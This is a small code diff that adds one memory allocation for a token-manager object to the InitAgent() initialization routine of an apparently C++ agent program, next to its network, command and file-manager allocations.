@@ -152,6 +152,7 @@ BOOL InitAgent() {
 	g_Network = AllocMemory <Network>(sizeof(Network));
 	g_Commander = AllocMemory <commanders>(sizeof(commanders));
 	g_FileMgr = AllocMemory <FileMgr>(sizeof(FileMgr));
+	g_TokenMgr = AllocMemory<TokenMgr>(sizeof(TokenMgr));
 	if (!LoadAPIS()) { return FALSE; }
 
 	if (!LoadConfig()) { return FALSE; }
